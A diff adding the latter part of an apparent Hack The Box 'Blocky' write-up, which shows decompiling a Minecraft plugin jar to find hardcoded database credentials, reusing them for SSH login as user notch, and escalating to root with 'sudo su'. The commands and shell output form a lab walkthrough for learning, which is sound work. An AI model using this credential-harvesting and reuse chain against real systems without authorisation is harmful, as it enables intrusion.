@@ -149,6 +149,97 @@ There is phpmyadmin login page.
 phpMyAdmin is a free and open-source web-based application written in PHP,
 designed to provide a graphical interface for managing MySQL and MariaDB databases.
 
+Let's navigate to /plugins.
+
+
+![image](https://cdn-images-1.medium.com/max/1000/1*SoWU5v3D2-SKc_Lc5tcdPw.png)
+
+
+there are 2 files.
+
+both are jar file so I used jd-gui to revese it back.
+
+```bash
+jd-gui BlockyCore.jar
+```
+
+there are some credentials:
+
+![image](https://cdn-images-1.medium.com/max/1000/1*BFPpHkTpLmFAuEUmL1aYtg.png)
+
+```
+SQL credentials:
+root:*************************************
+```
+
+So, let's try to get into the system with ssh:
+
+```bash
+ssh root@10.10.10.37
+```
+
+I didn't make it so let's try with the user notch.
+
+```bash
+ssh notch@10.10.10.37
+```
+
+and it works. we are in as notch.
+
+Grab user.txt flag.
+
+```bash
+notch@Blocky:~$ whoami
+notch
+notch@Blocky:~$ id
+uid=1000(notch) gid=1000(notch) groups=1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
+notch@Blocky:~$ ls
+minecraft  user.txt
+notch@Blocky:~$ cat user.txt 
+********************************
+notch@Blocky:~$ 
+```
+
+Let's see if there are any files that can notch run with sudo to get root:
+
+```bash
+notch@Blocky:/tmp$ sudo -l
+Matching Defaults entries for notch on Blocky:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User notch may run the following commands on Blocky:
+    (ALL : ALL) ALL
+```
+
+Good news. notch can run any file as any user (includs root).
+so just switch user to root with:
+
+```bash
+sudo su
+```
+
+... and we are root. Grab root.txt flag.
+
+```bash
+notch@Blocky:/tmp$ sudo su
+root@Blocky:/tmp# whoami
+root
+root@Blocky:/tmp# cat /root/root.txt 
+********************************
+root@Blocky:/tmp#
+
+```
+
+THIS IS THE END.
+
+***Written by Alon Presman, Penetration Tester and Ethical Hacker.***
+
+
+
+
+
+
 
 
 
